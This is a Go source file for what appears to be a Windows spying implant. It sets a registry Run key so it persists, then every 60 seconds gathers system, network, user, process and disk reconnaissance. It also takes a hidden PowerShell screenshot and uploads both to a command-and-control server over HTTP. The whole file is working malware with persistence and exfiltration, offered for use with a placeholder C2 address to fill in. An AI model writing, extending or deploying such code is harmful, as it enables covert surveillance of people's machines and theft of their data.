package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec" //added
	"path/filepath"
	"time"
)

func main() {
	// Get own executable path for persistence
	exePath, _ := os.Executable()

	// === PERSISTENCE: Registry Run Key (first run only) ===
	regPath := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	persistCmd := fmt.Sprintf(`reg add "%s" /v ReconBeacon /t REG_SZ /d "%s" /f`, regPath, exePath)
	exec.Command("cmd", "/C", persistCmd).Run()

	// === INFINITE 60-SECOND BEACONING LOOP ===
	for {
		os.MkdirAll(`C:\temp`, 0755)
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		var content string

		// === RECONNAISSANCE COLLECTION ===
		// === SECTION 1: HEADER ===
		content += fmt.Sprintf("=== RECONNAISSANCE REPORT ===\n")
		content += fmt.Sprintf("Generated: %s\n\n", timestamp)
		content += fmt.Sprintf("Beacon Cycle: %d\n\n", time.Now().Unix())

		// === SECTION 2: NETWORK INTERFACES ===
		content += "=== NETWORK INTERFACES ===\n"
		interfaces, _ := net.Interfaces()
		for _, i := range interfaces {
			addrs, _ := i.Addrs()
			content += fmt.Sprintf("Interface: %s (%v)\n", i.Name, addrs)
		}
		content += "\n"

		// === SECTION 3: SYSTEM INFO ===
		content += "=== SYSTEM INFORMATION ===\n"
		cmd := exec.Command("cmd", "/C", "systeminfo")
		output, _ := cmd.Output()
		content += string(output) + "\n\n"

		// === S-TIER: NETWORK CONNECTIONS (netstat -ano) ===
		content += "=== 1. NETWORK CONNECTIONS ===\n"
		cmd = exec.Command("cmd", "/C", "netstat -ano")
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		// === S-TIER: LOCAL ADMINS (net localgroup administrators) ===
		content += "=== 2. LOCAL ADMINS ===\n"
		cmd = exec.Command("cmd", "/C", "net localgroup administrators")
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		// === S-TIER: RUNNING PROCESSES (tasklist /fo csv) ===
		content += "=== 3. RUNNING PROCESSES ===\n"
		cmd = exec.Command("cmd", "/C", "tasklist /fo csv")
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		// === A-TIER: LOGGED-IN USERS (quser) ===
		content += "=== 4. LOGGED-IN USERS ===\n"
		cmd = exec.Command("cmd", "/C", "quser")
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		// === A-TIER: ARP CACHE (arp -a) ===
		content += "=== 5. ARP CACHE ===\n"
		cmd = exec.Command("cmd", "/C", "arp -a")
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		// === A-TIER: DISK INFORMATION (wmic logicaldisk) ===
		content += "=== 6. DISK INFORMATION ===\n"
		cmd = exec.Command("cmd", "/C", "wmic logicaldisk get size,freespace,caption")
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		// === WRITE RECON TO FILE ===
		reconPath := `C:\temp\recon_combined.txt`
		os.WriteFile(reconPath, []byte(content), 0644)

		// === TAKE SCREENSHOT (SAME FOLDER) ===
		screenshotPath := `C:\temp\screenshot.png`
		takeScreenshot(screenshotPath)

		// === C2 CALLBACK: EXFILTRATE BOTH FILES ===
		c2URL := "http://192.168.1.10:5000/beacon" // CHANGE TO YOUR PC IP!
		hostname, _ := os.Hostname()

		sendToC2(c2URL, reconPath, hostname)
		sendToC2(c2URL, screenshotPath, hostname)

		fmt.Printf("Recon + Screenshot beaconed at %s. Sleeping 60s...\n", timestamp)

		// SLEEP 60 SECONDS BEFORE NEXT CYCLE
		time.Sleep(60 * time.Second)
	}
}

// === POWERHELL SCREENSHOT (100% NATIVE, NO DEPENDENCIES) ===
func takeScreenshot(filepath string) {
	psCmd := fmt.Sprintf(`powershell -WindowStyle Hidden -Command "$s=[System.Windows.Forms.Screen]::PrimaryScreen; $b=[System.Drawing.Bitmap]::new($s.Bounds.Width, $s.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Bounds.Location, [System.Drawing.Point]::Empty, $s.Bounds.Size); $b.Save('%s', [System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $b.Dispose()"`, filepath)
	exec.Command("powershell", "-c", psCmd).Run()
}

func sendToC2(url, filePath, hostID string) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Printf("Failed to read %s: %v\n", filePath, err)
		return
	}

	req, err := http.NewRequest("POST", url, bytes.NewReader(data))
	if err != nil {
		return
	}

	timestamp := time.Now().Format("20060102_150405")
	fname := filepath.Base(filePath)
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Filename", fmt.Sprintf("%s_%s_%s", hostID, timestamp, fname))
	req.Header.Set("X-Host", hostID)

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("C2 upload failed for %s: %v\n", filePath, err)
		return
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	fmt.Printf("C2 Response [%s]: %s\n", filePath, string(respBody))
}
